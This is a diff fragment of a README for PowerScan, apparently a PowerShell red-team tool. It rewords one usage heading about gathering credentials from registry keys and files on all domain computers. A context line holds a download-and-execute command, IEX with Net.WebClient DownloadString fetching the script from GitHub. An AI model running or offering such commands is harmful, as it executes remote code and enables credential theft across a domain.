@@ -88,7 +88,7 @@ PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-SpoolerStatus} -ComputerDom
 ```
 
 
-Gather credentials from common files on all domain computers (using explicit credentials):
+Gather credentials from common registry keys and files on all domain computers (using explicit credentials):
 
 ```
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/PowerScan.ps1')
